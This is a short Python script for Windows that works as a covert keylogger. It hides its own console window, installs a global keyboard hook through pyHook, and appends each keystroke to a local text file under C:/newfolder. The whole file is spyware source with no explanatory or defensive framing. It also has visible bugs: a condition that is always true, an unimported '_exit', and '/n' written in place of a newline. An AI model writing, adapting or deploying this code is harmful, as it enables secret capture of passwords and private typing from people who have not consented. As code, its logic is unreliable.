import win32api
import win32console
import win32gui
import pythoncom,pyHook

win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
hm=pyHook.HookManager()

 
def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        f=open("C:/newfolder/output.txt",'r+')
        buffer=f.read()
        f.close()
        f=open("C:/newfolder/output.txt",'w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='/n'
        buffer+=keylogs
        f.write(buffer)
        f.close()
        
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
